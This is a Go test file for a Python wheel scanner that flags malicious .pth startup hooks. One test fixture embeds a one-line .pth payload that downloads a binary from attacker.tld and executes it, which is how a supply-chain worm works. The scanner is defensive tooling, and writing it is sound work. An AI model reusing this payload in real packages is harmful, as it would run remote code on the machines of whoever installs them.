package wheel_test

import (
	"archive/zip"
	"bytes"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan"
	"github.com/brynbellomy/veto/internal/pthscan/wheel"
)

func buildWheel(t *testing.T, entries map[string]string) (*bytes.Reader, int64) {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for name, content := range entries {
		fw, err := w.Create(name)
		require.NoError(t, err)
		_, err = fw.Write([]byte(content))
		require.NoError(t, err)
	}
	require.NoError(t, w.Close())
	return bytes.NewReader(buf.Bytes()), int64(buf.Len())
}

func TestInspectNoPth(t *testing.T) {
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py":              "",
		"foo-1.0.0.dist-info/METADATA": "Name: foo\n",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectDataSchemePurelibFlagsWorm(t *testing.T) {
	hadesBody := `import urllib.request, subprocess; ` +
		`urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); ` +
		`subprocess.Popen(['/tmp/bun','/tmp/_index.js'])` + "\n"
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py":                            "",
		"foo-1.0.0.data/purelib/ensmallen-setup.pth": hadesBody,
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
}

func TestInspectTopLevelPathOnlyClean(t *testing.T) {
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py":                  "",
		"foo-1.0.0.data/purelib/extras.pth": "some/path\nanother/path\n",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}

func TestInspectEditablePthClean(t *testing.T) {
	body := `import __editable___mypkg_0_1_0_finder; __editable___mypkg_0_1_0_finder.install()` + "\n"
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py": "",
		"foo-0.1.0.data/purelib/__editable__.mypkg-0.1.0.pth": body,
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}

func TestInspectIgnoresUnrelatedPaths(t *testing.T) {
	// A .pth-like name inside a tests dir or somewhere outside the data
	// scheme must not be evaluated as a startup hook.
	r, n := buildWheel(t, map[string]string{
		"foo/tests/fixtures/sample.pth": "import urllib.request",
		"foo/__init__.py":               "",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}
